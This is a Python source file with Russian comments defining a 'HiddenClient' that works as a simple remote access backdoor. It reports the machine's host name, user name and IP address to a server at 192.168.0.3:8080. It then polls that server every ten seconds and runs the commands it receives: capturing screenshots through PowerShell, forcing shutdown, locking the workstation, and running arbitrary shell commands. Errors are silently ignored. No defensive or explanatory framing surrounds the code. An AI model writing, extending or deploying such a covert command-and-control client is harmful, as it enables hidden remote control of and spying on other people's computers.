import requests
import time
import os
import subprocess
import socket
import sys

class HiddenClient:
    def __init__(self, server_ip="192.168.0.3", server_port=8080):
        self.server_url = f"http://{server_ip}:{server_port}"
        self.computer_name = socket.gethostname()
        self.user_name = os.getlogin()
        self.client_ip = self.get_local_ip()
        self.running = True
        
        # Безопасные пути для файлов
        self.temp_dir = os.environ.get('TEMP', 'C:\\Temp')
        self.log_file = os.path.join(self.temp_dir, "client_log.txt")
        self.test_file = os.path.join(self.temp_dir, "test_log.txt")
        
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "unknown"
    
    def write_log(self, message):
        """Безопасная запись в лог"""
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"{time.ctime()}: {message}\n")
        except:
            pass  # Молча игнорируем ошибки записи
    
    def register_with_server(self):
        try:
            data = {
                "computer_name": self.computer_name,
                "user_name": self.user_name,
                "ip_address": self.client_ip,
                "type": "client"
            }
            
            response = requests.post(
                f"{self.server_url}/register",
                json=data,
                timeout=5
            )
            
            return response.status_code == 200
                
        except Exception as e:
            self.write_log(f"Register error: {e}")
            return False
    
    def check_commands(self):
        try:
            response = requests.get(
                f"{self.server_url}/getcommand",
                timeout=5
            )
            
            if response.status_code == 200:
                command = response.text.strip()
                if command and command != "none":
                    self.execute_command(command)
                    
        except Exception as e:
            self.write_log(f"Check commands error: {e}")
    
    def execute_command(self, command):
        try:
            self.write_log(f"Executing command: {command}")
            
            if command == "test":
                # Тестовая команда
                with open(self.test_file, "w", encoding="utf-8") as f:
                    f.write(f"Test command received at {time.ctime()}\n")
                
            elif command == "screenshot":
                # Скриншот через PowerShell
                screenshot_path = os.path.join(self.temp_dir, "screenshot.bmp")
                ps_command = f'''
                Add-Type -AssemblyName System.Windows.Forms
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen
                $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
                $bitmap.Save("{screenshot_path}")
                '''
                subprocess.Popen(['powershell', '-Command', ps_command], shell=True)
                
            elif command == "shutdown":
                os.system("shutdown /s /f /t 0")
                
            elif command == "lock":
                os.system("rundll32.exe user32.dll,LockWorkStation")
                
            elif command.startswith("run:"):
                program = command[4:]
                subprocess.Popen(program, shell=True)
                
        except Exception as e:
            self.write_log(f"Command error: {e}")
    
    def run(self):
        # Начальная запись в лог
        self.write_log("=" * 50)
        self.write_log("CLIENT STARTED")
        self.write_log("=" * 50)
        self.write_log(f"Server: {self.server_url}")
        self.write_log(f"Computer: {self.computer_name}")
        self.write_log(f"User: {self.user_name}")
        self.write_log(f"IP: {self.client_ip}")
        self.write_log("=" * 50)
        
        # Основной цикл
        while self.running:
            try:
                if self.register_with_server():
                    self.write_log("Successfully registered with server")
                
                self.check_commands()
                time.sleep(10)
                
            except Exception as e:
                self.write_log(f"Main loop error: {e}")
                time.sleep(30)

if __name__ == "__main__":
    client = HiddenClient()
    client.run()